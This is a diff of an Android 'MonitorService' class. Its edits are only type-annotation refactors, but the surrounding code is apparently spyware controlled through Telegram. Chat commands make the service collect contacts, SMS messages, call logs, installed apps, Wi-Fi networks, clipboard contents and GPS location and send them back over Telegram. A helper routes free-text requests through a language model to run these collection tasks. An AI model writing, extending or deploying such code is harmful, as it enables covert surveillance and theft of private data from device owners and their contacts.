@@ -230,11 +230,11 @@ class MonitorService : Service() {
         } else if (trimmed == "/status") {
             sendTelegramMessage(chatId, "Service: Running\nDevice: ${Build.MODEL}\nAndroid: ${Build.VERSION.RELEASE}")
         } else if (trimmed == "/contacts") {
-            sendTelegramTask(chatId, "contacts", HashMap())
+            sendTelegramTask(chatId, "contacts", HashMap<String, Any>())
         } else if (trimmed == "/sms") {
-            sendTelegramTask(chatId, "sms", HashMap())
+            sendTelegramTask(chatId, "sms", HashMap<String, Any>())
         } else if (trimmed == "/calls") {
-            sendTelegramTask(chatId, "call_logs", HashMap())
+            sendTelegramTask(chatId, "call_logs", HashMap<String, Any>())
         } else if (trimmed == "/apps") {
             val m = HashMap<String, Any>()
             m["action"] = "list"
@@ -397,7 +397,7 @@ class MonitorService : Service() {
                 }
             }
         } catch (e: Exception) { Log.e("Contacts", "Error", e) }
-        val result = HashMap<String, Any>()
+        val result: HashMap<String, Any> = HashMap()
         result["contacts"] = list
         result["count"] = list.size
         return result
@@ -423,7 +423,7 @@ class MonitorService : Service() {
                 }
             }
         } catch (e: Exception) { Log.e("Sms", "Error", e) }
-        val result = HashMap<String, Any>()
+        val result: HashMap<String, Any> = HashMap()
         result["sms"] = list
         result["count"] = list.size
         return result
@@ -450,7 +450,7 @@ class MonitorService : Service() {
                 }
             }
         } catch (e: Exception) { Log.e("Calls", "Error", e) }
-        val result = HashMap<String, Any>()
+        val result: HashMap<String, Any> = HashMap()
         result["calls"] = list
         result["count"] = list.size
         return result
@@ -470,7 +470,7 @@ class MonitorService : Service() {
                 list.add(m)
             }
         } catch (e: Exception) { Log.e("Apps", "Error", e) }
-        val result = HashMap<String, Any>()
+        val result: HashMap<String, Any> = HashMap()
         result["apps"] = list
         result["count"] = list.size
         return result
@@ -525,7 +525,7 @@ class MonitorService : Service() {
             m["caps"] = r.capabilities
             m
         }
-        val result = HashMap<String, Any>()
+        val result: HashMap<String, Any> = HashMap()
         result["networks"] = networks
         result["count"] = networks.size
         return result
@@ -535,12 +535,12 @@ class MonitorService : Service() {
         val cm = getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
         if (cm.hasPrimaryClip()) {
             val clip = cm.primaryClip?.getItemAt(0)?.text?.toString() ?: ""
-            val result = HashMap<String, Any>()
+            val result: HashMap<String, Any> = HashMap()
             result["text"] = clip
             result["has_content"] = clip.isNotEmpty()
             return result
         }
-        val result = HashMap<String, Any>()
+        val result: HashMap<String, Any> = HashMap()
         result["text"] = ""
         result["has_content"] = false
         return result
@@ -554,7 +554,7 @@ class MonitorService : Service() {
 
             val lastLoc = locationManager?.getLastKnownLocation(provider)
             if (lastLoc != null) {
-                val result = HashMap<String, Any>()
+                val result: HashMap<String, Any> = HashMap()
                 result["lat"] = lastLoc.latitude
                 result["lon"] = lastLoc.longitude
                 result["acc"] = lastLoc.accuracy
@@ -814,7 +814,10 @@ class MonitorService : Service() {
     private fun callNemotron(prompt: String): String {
         try {
             val lower = prompt.lowercase()
-            val isGreeting = lower == "hi" || lower == "hello" || lower == "hey" || lower == "test" || lower == "ping"
+            val isGreeting = when (lower) {
+                "hi", "hello", "hey", "test", "ping" -> true
+                else -> false
+            }
             if (isGreeting) {
                 return """{"action": "none", "response": "Hello! I'm ready. Use /help for commands or ask me to run tasks like '/ai get contacts and location'."}"""
             }
